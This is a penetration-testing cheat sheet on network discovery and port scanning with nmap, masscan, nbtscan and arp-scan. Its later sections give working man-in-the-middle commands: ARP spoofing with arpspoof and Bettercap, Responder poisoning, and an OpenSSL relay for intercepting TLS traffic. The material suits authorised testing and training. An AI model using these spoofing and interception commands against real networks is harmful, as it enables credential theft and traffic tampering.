# Network Discovery

## DHCP

DHCP (Dynamic Host Configuration Protocol) is a networking protocol used to automatically assign IP addresses and other network configuration parameters to devices on a network. DHCP allows devices to obtain necessary network configuration information from a DHCP server, rather than having to be manually configured.

```ps1
sudo nmap --script broadcast-dhcp-discover
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-04 11:15 CET
Pre-scan script results:
| broadcast-dhcp-discover: 
|   Response 1 of 1: 
|     Interface: eth0
|     IP Offered: 192.168.1.111
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.254
|     IP Address Lease Time: 1d00h00m00s
|     Renewal Time Value: 12h00m00s
|     Rebinding Time Value: 21h00m00s
|     Broadcast Address: 192.168.1.255
|     Hostname: Host-005
|     Domain Name Server: 192.168.1.254
|     Domain Name: lan
|     Router: 192.168.1.254
|_    Subnet Mask: 255.255.255.0
```


## DNS

* AD DNS
    * LDAP: `nslookup -type=srv _ldap._tcp.dc._msdcs.<domain name>`
    * KDC: `nslookup -type=srv _kerberos._tcp.<domain name>`
    * Global catalog: `nslookup -type=srv _ldap._tcp.<domain name>`


## NBT-NS

NS (Name Service) is a component of NBT that provides name resolution services for NETBIOS names. In the context of NBT, NS is responsible for mapping NETBIOS names to IP addresses. 

NBT NS uses a distributed database to store NETBIOS name-to-IP address mappings. Each computer on the network is responsible for registering its own name and IP address in the database, and for resolving names to IP addresses when necessary. When a computer needs to resolve a NETBIOS name to an IP address, it sends a query to the NBT NS service on another computer on the network. The NBT NS service responds with the IP address associated with the requested name, if it is known. It works on `UDP, Port 137`.

* Get names:  `nbtscan -r 192.168.1.0/24`
* Get the name for a single IP: `nmblookup -A <IP>`


## MDNS

MDNS (Multicast Domain Name System) is a protocol used for zero-configuration networking, also known as "zeroconf". It allows devices on a local network to automatically discover each other and resolve hostnames to IP addresses without the need for a centralized DNS server.

MDNS works by using multicast addresses to send DNS queries and responses. When a device wants to resolve a hostname to an IP address, it sends a multicast DNS query to a special multicast address (224.0.0.251 for IPv4 and ff02::fb for IPv6). Any device on the network that is listening for multicast DNS queries and has a matching hostname will respond with its IP address.

```
mdns-scan
```


## ARP

ARP (Address Resolution Protocol) is a networking protocol used to map IP addresses to MAC (Media Access Control) addresses on a local area network (LAN). 

* ARP scan
    ```ps1
    root@kali:~# arp-scan -l
    Interface: eth0, datalink type: EN10MB (Ethernet)
    Starting arp-scan 1.9 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
    172.16.193.1 00:50:56:c0:00:08 VMware, Inc.
    172.16.193.2 00:50:56:f1:18:a8 VMware, Inc.
    172.16.193.254 00:50:56:e5:7b:87 VMware, Inc.
    ```

* ARP spoof with `arpspoof`
    ```ps1
    arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host
    arpspoof -i wlan0 -t 10.0.0.X 10.0.0.Y
    ```

* ARP spoof with `Bettercap`
    ```ps1
    sudo bettercap -iface wlan0
    net.probe on
    set arp.spoof.targets <target_IP>
    arp.spoof on
    net.sniff on
    ```


## Ping

* Ping sweep with `nmap`: no port scan, no DNS resolution

    ```powershell
    nmap -sn -n --disable-arp-ping 192.168.1.1-254 | grep -v "host down"
    -sn : Disable port scanning. Host discovery only.
    -n : Never do DNS resolution
    ```


## LDAP

* Null bind connection: `ldapsearch -x -h <ip> -s base`


## Port Scans and Enumeration

### Nmap

* Basic NMAP

```bash
sudo nmap -sSV -p- 192.168.0.1 -oA OUTPUTFILE -T4
sudo nmap -sSV -oA OUTPUTFILE -T4 -iL INPUTFILE.csv

• the flag -sSV defines the type of packet to send to the server and tells Nmap to try and determine any service on open ports
• the -p- tells Nmap to check all 65,535 ports (by default it will only check the most popular 1,000)
• 192.168.0.1 is the IP address to scan
• -oA OUTPUTFILE tells Nmap to output the findings in its three major formats at once using the filename "OUTPUTFILE"
• -iL INPUTFILE tells Nmap to use the provided file as inputs
```

* CTF NMAP

This configuration is enough to do a basic check for a CTF VM

```bash
nmap -sV -sC -oA ~/nmap-initial 192.168.1.1

-sV : Probe open ports to determine service/version info
-sC : to enable the script
-oA : to save the results

After this quick command you can add "-p-" to run a full scan while you work with the previous result
```

* Aggressive NMAP

```bash
nmap -A -T4 scanme.nmap.org
• -A: Enable OS detection, version detection, script scanning, and traceroute
• -T4: Defines the timing for the task (options are 0-5 and higher is faster)
```

* Using searchsploit to detect vulnerable services

```bash
nmap -p- -sV -oX a.xml IP_ADDRESS; searchsploit --nmap a.xml
```

* Generating nice scan report

```bash
nmap -sV IP_ADDRESS -oX scan.xml && xsltproc scan.xml -o "`date +%m%d%y`_report.html"
```

* NMAP Scripts

```bash
nmap -sC : equivalent to --script=default

nmap --script 'http-enum' -v web.xxxx.com -p80 -oN http-enum.nmap
PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|   /phpmyadmin/: phpMyAdmin
|   /.git/HEAD: Git folder
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)'
|_  /image/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)'

nmap --script smb-enum-users.nse -p 445 [target host]
Host script results:
| smb-enum-users:
|   METASPLOITABLE\backup (RID: 1068)
|     Full name:   backup
|     Flags:       Account disabled, Normal user account
|   METASPLOITABLE\bin (RID: 1004)
|     Full name:   bin
|     Flags:       Account disabled, Normal user account
|   METASPLOITABLE\msfadmin (RID: 3000)
|     Full name:   msfadmin,,,
|     Flags:       Normal user account

List Nmap scripts : ls /usr/share/nmap/scripts/
```

### Network Scan with nc and ping

Sometimes we want to perform network scan without any tools like nmap. So we can use the commands `ping` and `nc` to check if a host is up and which port is open.

To check if hosts are up on a /24 range

```bash
for i in `seq 1 255`; do ping -c 1 -w 1 192.168.1.$i > /dev/null 2>&1; if [ $? -eq 0 ]; then echo "192.168.1.$i is UP"; fi ; done
```

To check which ports are open on a specific host

```bash
for i in {21,22,80,139,443,445,3306,3389,8080,8443}; do nc -z -w 1 192.168.1.18 $i > /dev/null 2>&1; if [ $? -eq 0 ]; then echo "192.168.1.18 has port $i open"; fi ; done
```

Both at the same time on a /24 range

```bash
for i in `seq 1 255`; do ping -c 1 -w 1 192.168.1.$i > /dev/null 2>&1; if [ $? -eq 0 ]; then echo "192.168.1.$i is UP:"; for j in {21,22,80,139,443,445,3306,3389,8080,8443}; do nc -z -w 1 192.168.1.$i $j > /dev/null 2>&1; if [ $? -eq 0 ]; then echo "\t192.168.1.$i has port $j open"; fi ; done ; fi ; done
```

Not in one-liner version:

```bash
for i in `seq 1 255`; 
do 
    ping -c 1 -w 1 192.168.1.$i > /dev/null 2>&1; 
    if [ $? -eq 0 ]; 
    then 
        echo "192.168.1.$i is UP:"; 
        for j in {21,22,80,139,443,445,3306,3389,8080,8443}; 
        do 
            nc -z -w 1 192.168.1.$i $j > /dev/null 2>&1; 
            if [ $? -eq 0 ]; 
            then 
                echo "\t192.168.1.$i has port $j open"; 
            fi ; 
        done ; 
    fi ; 
done
```


### Masscan

```powershell
masscan -iL ips-online.txt --rate 10000 -p1-65535 --only-open -oL masscan.out
masscan -e tun0 -p1-65535,U:1-65535 10.10.10.97 --rate 1000

# find machines on the network
sudo masscan --rate 500 --interface tap0 --router-ip $ROUTER_IP --top-ports 100 $NETWORK -oL masscan_machines.tmp
cat masscan_machines.tmp | grep open | cut -d " " -f4 | sort -u > masscan_machines.lst

# find open ports for one machine
sudo masscan --rate 1000 --interface tap0 --router-ip $ROUTER_IP -p1-65535,U:1-65535 $MACHINE_IP --banners -oL $MACHINE_IP/scans/masscan-ports.lst


# TCP grab banners and services information
TCP_PORTS=$(cat $MACHINE_IP/scans/masscan-ports.lst| grep open | grep tcp | cut -d " " -f3 | tr '\n' ',' | head -c -1)
[ "$TCP_PORTS" ] && sudo nmap -sT -sC -sV -v -Pn -n -T4 -p$TCP_PORTS --reason --version-intensity=5 -oA $MACHINE_IP/scans/nmap_tcp $MACHINE_IP

# UDP grab banners and services information
UDP_PORTS=$(cat $MACHINE_IP/scans/masscan-ports.lst| grep open | grep udp | cut -d " " -f3 | tr '\n' ',' | head -c -1)
[ "$UDP_PORTS" ] && sudo nmap -sU -sC -sV -v -Pn -n -T4 -p$UDP_PORTS --reason --version-intensity=5 -oA $MACHINE_IP/scans/nmap_udp $MACHINE_IP
```

### Reconnoitre

Dependencies:

* nbtscan
* nmap

```powershell
python2.7 ./reconnoitre.py -t 192.168.1.2-252 -o ./results/ --pingsweep --hostnames --services --quick
```

If you have a segfault with nbtscan, read the following quote.
> Permission is denied on the broadcast address (.0) and it segfaults on the gateway (.1) - all other addresses seem fine here.So to mitigate the problem: nbtscan 192.168.0.2-255

## Netdiscover

```powershell
netdiscover -i eth0 -r 192.168.1.0/24
Currently scanning: Finished!   |   Screen View: Unique Hosts

20 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 876
_____________________________________________________________________________
IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
192.168.1.AA    68:AA:AA:AA:AA:AA     15     630  Sagemcom
192.168.1.XX    52:XX:XX:XX:XX:XX      1      60  Unknown vendor
192.168.1.YY    24:YY:YY:YY:YY:YY      1      60  QNAP Systems, Inc.
192.168.1.ZZ    b8:ZZ:ZZ:ZZ:ZZ:ZZ      3     126  HUAWEI TECHNOLOGIES CO.,LTD  
```

## Responder

```powershell
responder -I eth0 -A # see NBT-NS, BROWSER, LLMNR requests without responding.
responder.py -I eth0 -wrf
```

Alternatively you can use the [Windows version](https://github.com/lgandx/Responder-Windows)

## MITM

* WSUS poisoning
* ARP poisoning
* DHCP poisoning: `responder --interface "eth0" --DHCP --wpad`


### Bettercap

```powershell
bettercap -X --proxy --proxy-https -T <target IP>
# better cap in spoofing, discovery, sniffer
# intercepting http and https requests,
# targetting specific IP only
```


### SSL MITM with OpenSSL

This code snippet allows you to sniff/modify SSL traffic if there is a MITM vulnerability using only openssl.
If you can modify `/etc/hosts` of the client:

```powershell
sudo echo "[OPENSSL SERVER ADDRESS] [domain.of.server.to.mitm]" >> /etc/hosts  # On client host
```

On our MITM server, if the client accepts self signed certificates (you can use a legit certificate if you have the private key of the legit server):

```powershell
openssl req -subj '/CN=[domain.of.server.to.mitm]' -batch -new -x509 -days 365 -nodes -out server.pem -keyout server.pem
```

On our MITM server, we setup our infra:

```powershell
mkfifo response
sudo openssl s_server -cert server.pem -accept [INTERFACE TO LISTEN TO]:[PORT] -quiet < response | tee | openssl s_client -quiet -servername [domain.of.server.to.mitm] -connect[IP of server to MITM]:[PORT] | tee | cat > response
```

In this example, traffic is only displayed with `tee` but we could modify it using `sed` for example.


## References

* [Pwning the Domain: Credentialess/Username - hadess - February 7, 2024 ](https://hadess.io/pwning-the-domain-credentialess-username/)
